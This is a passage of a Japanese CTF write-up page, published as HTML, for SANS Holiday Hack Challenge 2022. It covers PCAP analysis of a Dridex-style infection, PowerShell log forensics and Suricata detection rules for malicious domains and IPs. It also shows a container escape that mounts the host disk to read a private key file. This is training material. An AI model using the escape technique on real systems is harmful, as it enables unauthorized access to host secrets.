@@ -1,0 +1,718 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>SANS Holiday Hack Challenge (Kringlecon) 2022 Writeup - CTF フラxxグゲット</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2022.kringlecon.com/ 新年明けまして おめでとうございます！ 今年も SANS の Holiday Hack Challenge (Kringlecon) にちょっとだけ参加しました。 過去にも何度か参加してますが" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
+
+
+
+<meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
+
+
+<meta name="generator" content="Hugo 0.74.2 with theme even" />
+
+
+<link rel="canonical" href="https://captureamerica.github.io/writeups/post/kringlecon_2022/" />
+<link rel="apple-touch-icon" sizes="180x180" href="https://captureamerica.github.io/writeups/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://captureamerica.github.io/writeups/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://captureamerica.github.io/writeups/favicon-16x16.png">
+<link rel="manifest" href="https://captureamerica.github.io/writeups/manifest.json">
+<link rel="mask-icon" href="https://captureamerica.github.io/writeups/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="https://captureamerica.github.io/writeups/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+
+
+
+<meta property="og:title" content="SANS Holiday Hack Challenge (Kringlecon) 2022 Writeup" />
+<meta property="og:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2022.kringlecon.com/ 新年明けまして おめでとうございます！ 今年も SANS の Holiday Hack Challenge (Kringlecon) にちょっとだけ参加しました。 過去にも何度か参加してますが" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/kringlecon_2022/" />
+<meta property="article:published_time" content="2023-01-09T13:00:00+09:00" />
+<meta property="article:modified_time" content="2023-01-09T13:00:00+09:00" />
+<meta itemprop="name" content="SANS Holiday Hack Challenge (Kringlecon) 2022 Writeup">
+<meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2022.kringlecon.com/ 新年明けまして おめでとうございます！ 今年も SANS の Holiday Hack Challenge (Kringlecon) にちょっとだけ参加しました。 過去にも何度か参加してますが">
+<meta itemprop="datePublished" content="2023-01-09T13:00:00&#43;09:00" />
+<meta itemprop="dateModified" content="2023-01-09T13:00:00&#43;09:00" />
+<meta itemprop="wordCount" content="2668">
+
+
+
+<meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="SANS Holiday Hack Challenge (Kringlecon) 2022 Writeup"/>
+<meta name="twitter:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2022.kringlecon.com/ 新年明けまして おめでとうございます！ 今年も SANS の Holiday Hack Challenge (Kringlecon) にちょっとだけ参加しました。 過去にも何度か参加してますが"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="https://captureamerica.github.io/writeups/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="https://captureamerica.github.io/writeups/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="https://captureamerica.github.io/writeups/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="https://captureamerica.github.io/writeups/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="https://captureamerica.github.io/writeups/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">SANS Holiday Hack Challenge (Kringlecon) 2022 Writeup</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2023-01-09 </span>
+        <div class="post-category">
+            <a href="https://captureamerica.github.io/writeups/categories/ctf/"> CTF </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#tolkien-ring---wireshark-practice-difficulty-1">Tolkien Ring - Wireshark Practice (Difficulty: 1)</a>
+      <ul>
+        <li><a href="#challenge">Challenge</a></li>
+        <li><a href="#solution">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#tolkien-ring---windows-event-logs-difficulty-2">Tolkien Ring - Windows Event Logs (Difficulty: 2)</a>
+      <ul>
+        <li><a href="#challenge-1">Challenge</a></li>
+        <li><a href="#solution-1">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#tolkien-ring---suricata-regatta-difficulty-3">Tolkien Ring - Suricata Regatta (Difficulty: 3)</a>
+      <ul>
+        <li><a href="#challenge-2">Challenge</a></li>
+        <li><a href="#solution-2">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#elfen-ring---prison-escape-difficulty-3">Elfen Ring - Prison Escape (Difficulty: 3)</a>
+      <ul>
+        <li><a href="#challenge-3">Challenge</a></li>
+        <li><a href="#solution-3">Solution</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
+<img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
+<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
+<div class='align-right'>
+<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fkringlecon_2022%2F">
+<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
+</a>
+</div>
+<p>URL: <a href="https://2022.kringlecon.com/">https://2022.kringlecon.com/</a>
+<br /><br /></p>
+<p>新年明けまして おめでとうございます！</p>
+<p>今年も SANS の Holiday Hack Challenge (Kringlecon) にちょっとだけ参加しました。</p>
+<p>過去にも何度か参加してますが、チャレンジ文とヒントを別々に集めないといけなかったり、チャレンジを解くのにマップを移動しないといけない仕様が未だに慣れません。。。</p>
+<p><br /></p>
+<p>進捗具合は以下の感じ。（各リングの全てのスクリーンショットを撮るのは面倒なので、Objectiveのトップ画面のみ）</p>
+<img src="https://captureamerica.github.io/writeups/img/kringlecon_2022_Objectives.png" alt="kringlecon_2022_Objectives.png">
+<p><br /></p>
+<p><br /><br /></p>
+<h2 id="tolkien-ring---wireshark-practice-difficulty-1">Tolkien Ring - Wireshark Practice (Difficulty: 1)</h2>
+<hr>
+<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Use the Wireshark Phishing terminal in the Tolkien Ring to solve the mysteries around the suspicious PCAP.</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>suspicious.pcap</li>
+</ul>
+<p><br /></p>
+<h3 id="solution">Solution</h3>
+<p>ターミナルに出てくる問題をひとつずつ解いていきます。</p>
+<blockquote>
+<ol>
+<li>There are objects in the PCAP file that can be exported by Wireshark and/or Tshark. What type of objects can be exported from the PCAP?</li>
+</ol>
+</blockquote>
+<p>Answer: <code>http</code></p>
+<p><br /></p>
+<blockquote>
+<ol start="2">
+<li>What is the file name of the largest file we can export?</li>
+</ol>
+</blockquote>
+<p>Answer: <code>app.php</code></p>
+<p><br /></p>
+<blockquote>
+<ol start="3">
+<li>What packet number starts that app.php file?</li>
+</ol>
+</blockquote>
+<p>Answer: <code>687</code></p>
+<p><br /></p>
+<blockquote>
+<ol start="4">
+<li>What is the IP of the Apache server?</li>
+</ol>
+</blockquote>
+<p>Answer: <code>192.185.57.242</code></p>
+<p><br /></p>
+<blockquote>
+<ol start="5">
+<li>What file is saved to the infected host?</li>
+</ol>
+</blockquote>
+<p>Answer: <code>Ref_Sept24-2020.zip</code></p>
+<p><br /></p>
+<p>ちなみに、このpcapファイルからそのファイル自体を取り出すこともできます。<br/></p>
+<p>Frame 687にある、ここら辺です。</p>
+<img src="https://captureamerica.github.io/writeups/img/kringlecon_2022_wireshark1.png" alt="kringlecon_2022_wireshark1.png">
+<p><br />
+テキストファイルに落として、base64でデコードするだけです。思いっきりMalwareっぽいので取り扱いには要注意。</p>
+<p><a href="https://www.virustotal.com/gui/file/fad001d463e892e7844040cabdcfa8f8431c07e7ef1ffd76ffbd190f49d7693d/details">https://www.virustotal.com/gui/file/fad001d463e892e7844040cabdcfa8f8431c07e7ef1ffd76ffbd190f49d7693d/details</a> <br/>
+(VirusTotal Score: 45/69)</p>
+<p><br /></p>
+<blockquote>
+<ol start="6">
+<li>Attackers used bad TLS certificates in this traffic. Which countries were they registered to? Submit the names of the countries in alphabetical order separated by a commas (Ex: Norway, South Korea).</li>
+</ol>
+</blockquote>
+<p>Wiresharkにて、<code>x509sat.CountryName</code>でフィルターすると、パケット数がだいぶ絞れます。</p>
+<p>Server Hello内のCertificateを見ていくと、以下の4つの国コードが見つかります。<br/></p>
+<ul>
+<li>US: United States</li>
+<li>IE: Ireland</li>
+<li>SS: South Sudan</li>
+<li>IL: Israel</li>
+</ul>
+<p>Answer: <code>Ireland, Israel, South Sudan, United States</code></p>
+<p><br /></p>
+<blockquote>
+<ol start="7">
+<li>Is the host infected (Yes/No)?</li>
+</ol>
+</blockquote>
+<p>Answer: <code>Yes</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="tolkien-ring---windows-event-logs-difficulty-2">Tolkien Ring - Windows Event Logs (Difficulty: 2)</h2>
+<hr>
+<h3 id="challenge-1">Challenge</h3>
+<blockquote>
+<p>Investigate the Windows event log mystery in the terminal or offline.
+<br /><br />
+Hint: New to Windows event logs? Get a jump start with Eric&rsquo;s talk!
+<br />
+<a href="https://www.youtube.com/watch?v=5NZeHYPMXAE">https://www.youtube.com/watch?v=5NZeHYPMXAE</a></p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>powershell.evtx</li>
+</ul>
+<p><br /></p>
+<h3 id="solution-1">Solution</h3>
+<p>まずは、Windowsマシンで上記ファイルを開き、powershelllogs.txt というファイル名でテキストとして保存しておきます。</p>
+<p>次に、YouTubeビデオの通りにいくつかコマンドを実行してみます。</p>
+<pre>
+PS C:\Users\XXX\Desktop> Get-Content .\powershelllogs.txt | where-object {$_ -match '[0-9]{1,2}/[0-9]{1,2}/[0-9]{4}'} | ForEach-Object{($_ -split "\s+")[1]} | Group-Object
+
+Count Name                      Group
+----- ----                      -----
+ 2088 12/13/2022                {12/13/2022, 12/13/2022, 12/13/2022, 12/13/2022...}
+  181 12/4/2022                 {12/4/2022, 12/4/2022, 12/4/2022, 12/4/2022...}
+ 3540 12/24/2022                {12/24/2022, 12/24/2022, 12/24/2022, 12/24/2022...}
+   36 12/18/2022                {12/18/2022, 12/18/2022, 12/18/2022, 12/18/2022...}
+  240 11/11/2022                {11/11/2022, 11/11/2022, 11/11/2022, 11/11/2022...}
+    1 Generated                 {Generated}
+ 1422 11/19/2022                {11/19/2022, 11/19/2022, 11/19/2022, 11/19/2022...}
+ 2811 12/22/2022                {12/22/2022, 12/22/2022, 12/22/2022, 12/22/2022...}
+   36 11/25/2022                {11/25/2022, 11/25/2022, 11/25/2022, 11/25/2022...}
+   46 10/13/2022                {10/13/2022, 10/13/2022, 10/13/2022, 10/13/2022...}
+   34 10/31/2022                {10/31/2022, 10/31/2022, 10/31/2022, 10/31/2022...}
+    4 name=""InputObject"";     {name=""InputObject"";, name=""InputObject"";, name=""InputObject"";, name=""InputObject"";}
+    1 name=""Value"";           {name=""Value"";}
+
+
+PS C:\Users\XXX\Desktop> $chrono = Get-Content -Path .\powershelllogs.txt
+PS C:\Users\XXX\Desktop> [array]::Reverse($chrono)
+PS C:\Users\XXX\Desktop> $chrono | Select-String "^\$" | more
+
+$foo = Get-Content .\Recipe| % {$_-replace 'honey','fish oil'}
+$foo = Get-Content .\Recipe| % {$_ -replace 'honey', 'fish oil'}
+$foo = Get-Content .\Recipe| % {$_ -replace 'honey', 'fish oil'} $foo | Add-Content -Path 'recipe_updated.txt'
+$OutputCollection | Sort-Object HotFixID | Format-Table -AutoSize
+$OutputCollection += $output
+$output | add-member NoteProperty "Title" -value $string
+$output | add-member NoteProperty "HotFixID" -value $KB.` $_.Matches `.Value
+$output = New-Object -TypeName PSobject
+$KB = $string | Select-String -Pattern $regex | Select-Object {$_.Matches }
+$Regex = "KB\d*"
+$string = $update.title
+$OutputCollection= @()
+$all = $wu.QueryHistory(0,$totalupdates)
+$totalupdates = $wu.GetTotalHistoryCount()
+$wu = new-object -com "Microsoft.Update.Searcher"
+$foo = Get-Content .\Recipe| % {$_-replace 'honey','fish oil'} $foo | Add-Content -Path 'recipe_updated.txt'
+$foo = Get-Content .\Recipe| % {$_-replace 'honey','fish oil'}
+$foo | Add-Content -Path 'Recipe'
+$global:?
+$global:?
+$global:?
+$global:?
+$foo | Add-Content -Path 'Recipe.txt'
+$global:?
+$global:?
+$foo | Add-Content -Path 'Recipe.txt'
+$foo | Add-Content -Path 'Recipe.txt'
+$global:?
+$global:?
+$foo | Add-Content -Path 'recipe_updated.txt'
+</pre>
+<p><br /></p>
+<p>この結果を元に、ターミナルに出てくる問題をひとつずつ解いていきます。結構、トライ＆エラーしました^^;</p>
+<blockquote>
+<ol>
+<li>What month/day/year did the attacker take place? For example, 09/05/2021.</li>
+</ol>
+</blockquote>
+<p>Answer: <code>12/24/2022</code></p>
+<p><br /></p>
+<blockquote>
+<ol start="2">
+<li>An attacker got a secret from a file. What was the original file&rsquo;s name?</li>
+</ol>
+</blockquote>
+<p>Answer: <code>Recipe</code></p>
+<p>(答えを部分的にしかチェックしていないのか、<code>Recipe.txt</code> でも正解とみなされます。。。)</p>
+<p><br /></p>
+<blockquote>
+<ol start="3">
+<li>The contents of the previous file were retrieved, changed, and stored to a variable by the attacker. This was done multiple times. Submit the last full PowerShell line that performed only these actions.</li>
+</ol>
+</blockquote>
+<p>Answer: <code>$foo = Get-Content .\Recipe| % {$_ -replace 'honey', 'fish oil'} $foo | Add-Content -Path 'recipe_updated.txt'</code></p>
+<p><br /></p>
+<blockquote>
+<ol start="4">
+<li>After storing the altered file contents into the variable, the attacker used the variable to run a separate command that wrote the modified data to a file. This was done multiple times. Submit the last full PowerShell line that performed only this action.</li>
+</ol>
+</blockquote>
+<p>Answer: <code>$foo | Add-Content -Path 'Recipe'</code></p>
+<p><br /></p>
+<blockquote>
+<ol start="5">
+<li>The attacker ran the previous command against one file multiple times. What is the name of this file?</li>
+</ol>
+</blockquote>
+<p>Answer: <code>Recipe.txt</code></p>
+<p><br /></p>
+<blockquote>
+<ol start="6">
+<li>Were any files deleted? (Yes/No)</li>
+</ol>
+</blockquote>
+<p>Answer: <code>Yes</code></p>
+<p><br /></p>
+<blockquote>
+<ol start="7">
+<li>Was the original file (from question 2) deleted? (Yes/No)</li>
+</ol>
+</blockquote>
+<p>Answer: <code>No</code></p>
+<p><br /></p>
+<blockquote>
+<ol start="8">
+<li>What is the Event ID of the logs that show the actual command lines the attacker typed and ran?</li>
+</ol>
+</blockquote>
+<p>Answer: <code>4104</code></p>
+<p><br /></p>
+<blockquote>
+<ol start="9">
+<li>Is the secret ingrediant compromised (Yes/No)?</li>
+</ol>
+</blockquote>
+<p>Answer: <code>Yes</code></p>
+<p><br /></p>
+<blockquote>
+<ol start="10">
+<li>What is the secret ingredient?</li>
+</ol>
+</blockquote>
+<img src="https://captureamerica.github.io/writeups/img/kringlecon_2022_eventlog.png" alt="kringlecon_2022_eventlog.png">
+<p>Answer: <code>1/2 tsp honey</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="tolkien-ring---suricata-regatta-difficulty-3">Tolkien Ring - Suricata Regatta (Difficulty: 3)</h2>
+<hr>
+<h3 id="challenge-2">Challenge</h3>
+<blockquote>
+<p>Help detect this kind of malicious activity in the future by writing some Suricata rules.
+<br /><br />
+Use your investigative analysis skills and the suspicious.pcap file to help develop Suricata rules for the elves!
+<br /><br />
+There&rsquo;s a short list of rules started in suricata.rules in your home directory.</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>suspicious.pcap</li>
+</ul>
+<p><br /></p>
+<h3 id="solution-2">Solution</h3>
+<p>ターミナルに入って、ホームディレクトリにあるサンプルを参考にルールを書いていきます。以下がサンプルです。</p>
+<pre>
+elf@2971066f0db8:~$ cat suricata.rules
+alert http any any -> any any (msg:"FILE tracking PNG (1x1 pixel) (1)"; filemagic:"PNG image data, 1 x 1,"; sid:19; rev:1;)
+alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"ET HUNTING Possible ELF executable sent when remote host claims to send a Text File"; flow:established,from_server; http.header; content:"Content-Type|3a 20|text/plain"; file.data; content:"|7f 45 4c 46|"; startswith; fast_pattern; isdataat:3000,relative; classtype:bad-unknown; sid:2032973; rev:1; metadata:updated_at 2021_05_18;)
+alert ip any any -> any any (msg:"SURICATA IPv4 invalid checksum"; ipv4-csum:invalid; classtype:protocol-command-decode; sid:2200073; rev:2;)
+alert ip [199.184.82.0/24,199.184.223.0/24] any -> $HOME_NET any (msg:"ET DROP Spamhaus DROP Listed Traffic Inbound group 27"; reference:url,www.spamhaus.org/drop/drop.lasso; threshold: type limit, track by_src, seconds 3600, count 1; classtype:misc-attack; flowbits:set,ET.Evil; flowbits:set,ET.DROPIP; sid:2400026; rev:3398; metadata:updated_at 2022_10_06;)
+alert dns $HOME_NET any -> any any (msg:"ET WEB_CLIENT Malicious Chrome Extension Domain Request (stickies .pro in DNS Lookup)"; dns.query; content:"stickies.pro"; nocase; sid:2025218; rev:4;)
+alert tcp any any -> any any (msg:"SURICATA Applayer No TLS after STARTTLS"; flow:established; app-layer-event:applayer_no_tls_after_starttls; flowint:applayer.anomaly.count,+,1; classtype:protocol-command-decode; sid:2260004; rev:2;)
+alert pkthdr any any -> any any (msg:"SURICATA IPv4 total length smaller than header size"; decode-event:ipv4.iplen_smaller_than_hlen; classtype:protocol-command-decode; sid:2200002; rev:2;)
+alert udp any any -> any 123 (msg:"ET DOS Possible NTP DDoS Inbound Frequent Un-Authed GET_RESTRICT Requests IMPL 0x02"; content:"|00 02 10|"; offset:1; depth:3; byte_test:1,!&,128,0; byte_test:1,&,4,0; byte_test:1,&,2,0; byte_test:1,&,1,0; threshold: type both,track by_dst,count 2,seconds 60; classtype:attempted-dos; sid:2019021; rev:3; metadata:created_at 2014_08_26, updated_at 2014_08_26;)
+</pre>
+<p><br /></p>
+<blockquote>
+<p>First, please create a Suricata rule to catch DNS lookups for <code>adv.epostoday.uk</code>.
+<br />
+Whenever there&rsquo;s a match, the alert message (msg) should read <code>Known bad DNS lookup, possible Dridex infection</code>.
+<br />
+Add your rule to suricata.rules
+<br /><br />
+Once you think you have it right, run ./rule_checker to see how you&rsquo;ve done!
+<br />
+As you get rules correct, rule_checker will ask for more to be added.</p>
+</blockquote>
+<p>Suricataルールの書き方は少しググって調べました。</p>
+<ul>
+<li>
+<p>sidはルールに付けるIDで必須らしいです。値自体は、Reserved for Local Use（1000000-1999999）からテキトーにピックアップ。</p>
+</li>
+<li>
+<p>revはそのルールのrevisionなのでテキトーに1にしてます。無くてもいいはず。</p>
+</li>
+</ul>
+<p>Answer:</p>
+<p><code>$ echo 'alert dns $HOME_NET any -&gt; any any (msg:&quot;Known bad DNS lookup, possible Dridex infection&quot;; dns.query; content:&quot;adv.epostoday.uk&quot;; nocase; sid:1000000; rev:1;)' &gt;&gt; ./suricata.rules</code></p>
+<p><br /></p>
+<blockquote>
+<p>STINC thanks you for your work with that DNS record! In this PCAP, it points to 192.185.57.242.
+<br />
+Develop a Suricata rule that alerts whenever the infected IP address <code>192.185.57.242</code> communicates with internal systems over HTTP.
+<br />
+When there&rsquo;s a match, the message (msg) should read <code>Investigate suspicious connections, possible Dridex infection</code></p>
+</blockquote>
+<p>Answer:</p>
+<p><code>$ echo 'alert http [192.185.57.242,$HOME_NET] any -&gt; [192.185.57.242,$HOME_NET] any (msg:&quot;Investigate suspicious connections, possible Dridex infection&quot;; sid:1000001; rev:1;)' &gt;&gt; ./suricata.rules</code></p>
+<p><br /></p>
+<blockquote>
+<p>We heard that some naughty actors are using TLS certificates with a specific <code>CN</code>.
+<br />
+Develop a Suricata rule to match and alert on an SSL certificate for <code>heardbellith.Icanwepeh.nagoya</code>.
+<br />
+When your rule matches, the message (msg) should read <code>Investigate bad certificates, possible Dridex infection</code></p>
+</blockquote>
+<p>Answer:</p>
+<p><code>$ echo 'alert tcp any any -&gt; any any (msg:&quot;Investigate bad certificates, possible Dridex infection&quot;; tls.cert_subject; content:&quot;CN=heardbellith.Icanwepeh.nagoya&quot;; nocase; sid:1000002; rev:1;)' &gt;&gt; ./suricata.rules</code></p>
+<p><br /></p>
+<blockquote>
+<p>OK, one more to rule them all and in the darkness find them.
+<br />
+Let&rsquo;s watch for one line from the JavaScript: <code>let byteCharacters = atob</code>
+<br />
+Oh, and that string might be GZip compressed - I hope that&rsquo;s OK!
+<br />
+Just in case they try this again, please alert on that HTTP data with message <code>Suspicious JavaScript function, possible Dridex infection</code></p>
+</blockquote>
+<p>以下を参考にしました。GZip圧縮されていたとしても単純に <code>http.response_body</code> でいいらしいです。</p>
+<p>Answer:</p>
+<p><code>$ echo 'alert http any any -&gt; any any (msg:&quot;Suspicious JavaScript function, possible Dridex infection&quot;; http.response_body; content:&quot;let byteCharacters = atob&quot;; nocase; sid:1000003; rev:1;)' &gt;&gt; ./suricata.rules</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="elfen-ring---prison-escape-difficulty-3">Elfen Ring - Prison Escape (Difficulty: 3)</h2>
+<hr>
+<h3 id="challenge-3">Challenge</h3>
+<blockquote>
+<p>Escape from a container. Get hints for this challenge from Bow Ninecandle in the Elfen Ring. What hex string appears in the host file <code>/home/jailer/.ssh/jail.key.priv</code>?</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-3">Solution</h3>
+<p>ターミナルでアクセスできるのは、コンテナ内のCLIです。sudoで任意のコマンドが実行できます。</p>
+<pre>
+grinchum-land:~$ sudo -l
+User samways may run the following commands on grinchum-land:
+    (ALL) NOPASSWD: ALL
+</pre>
+<p><br /></p>
+<p>ゴールは、コンテナ内からホスト側にある<code>/home/jailer/.ssh/jail.key.priv</code>にアクセスすることです。
+<br /><br />
+以下のサイトを参考にしました。<br />
+<a href="https://www.cybereason.com/blog/container-escape-all-you-need-is-cap-capabilities">https://www.cybereason.com/blog/container-escape-all-you-need-is-cap-capabilities</a> <br />
+<a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities</a> <br /></p>
+<br>
+<p><code>/proc/1/status</code>を見るといいらしいです。（たぶん）</p>
+<pre>
+grinchum-land:~$ grep Cap /proc/1/status
+CapInh: 0000000000000000
+CapPrm: 0000003fffffffff
+CapEff: 0000003fffffffff
+CapBnd: 0000003fffffffff
+CapAmb: 0000000000000000
+</pre>
+<p><br /></p>
+<p>ターミナル上には<code>capsh</code>が入っていませんが、自分のKaliには入っていたので、どのフラグが立っているか確認してみました。</p>
+<p>いっぱい出てきたし、出力結果はぶっちゃけ見てません^^;</p>
+<p>たぶん全てのcapabilityがONなんだと思われます。</p>
+<pre>
+captureamerica@kali:~$ capsh --decode=0000003fffffffff
+0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
+</pre>
+<p><br /></p>
+<p>fdiskコマンドでパーティションの確認をします。<code>/dev/vda</code>ですね。</p>
+<pre>
+grinchum-land:~$ sudo fdisk -l
+Disk /dev/vda: 2048 MB, 2147483648 bytes, 4194304 sectors
+2048 cylinders, 64 heads, 32 sectors/track
+Units: sectors of 1 * 512 = 512 bytes
+</pre>
+<p><br /></p>
+<p>あとは、<code>mount</code>して該当ファイルを見るだけ。</p>
+<pre>
+grinchum-land:~$ sudo mount /dev/vda /mnt/
+grinchum-land:~$ cat /mnt/home/jailer/.ssh/jail.key.priv
+
+                Congratulations! 
+
+          You've found the secret for the 
+          HHC22 container escape challenge!
+
+                     .--._..--.
+              ___   ( _'-_  -_.'
+          _.-'   `-._|  - :- |
+      _.-'           `--...__|
+   .-'                       '--..___
+  / `._                              \
+   `. `._               one           |
+     `. `._                           /
+       '. `._    :__________....-----'
+         `..`---'    |-_  _- |___...----..._
+                     |_....--'             `.`.
+               _...--'                       `.`.
+          _..-'                             _.'.'
+       .-'             step                _.'.'
+       |                               _.'.'
+       |                   __....------'-'
+       |     __...------''' _|
+       '--'''        |-  - _ |
+               _.-''''''''''''''''''-._
+            _.'                        |\
+          .'                         _.' |
+          `._          closer           |:.'
+            `._                     _.' |
+               `..__                 |  |
+                    `---.._.--.    _|  |
+                     | _   - | `-.._|_.'
+          .--...__   |   -  _|
+         .'_      `--.....__ |
+        .'_                 `--..__
+       .'_                         `.
+      .'_    082bb339ec19de4935867   `-.
+      `--..____                        _`.
+               ```--...____          _..--'
+                     | - _ ```---.._.'
+                     |   - _ |
+                     |_ -  - |
+                     |   - _ |
+                     | -_  -_|
+                     |   - _ |
+                     |   - _ |
+                     | -_  -_|
+
+</pre>
+<p>Answer: <code>082bb339ec19de4935867</code></p>
+<p><br /><br />
+<br /><br /></p>
+<hr>
+<p><br /><br />
+<br /><br /></p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">CaptureAmerica @ CTF フラxxグゲット</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">LastMod</span>
+    <span class="item-content">
+        2023-01-09
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://captureamerica.github.io/writeups/tags/ctf/">CTF</a>
+          </div>
+      <nav class="post-nav">
+        
+        <a class="next" href="https://captureamerica.github.io/writeups/post/digitaloverdose_ractf_2022/">
+            <span class="next-text nav-default">Digital Overdose 2022 Autumn CTF Writeup</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
+  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
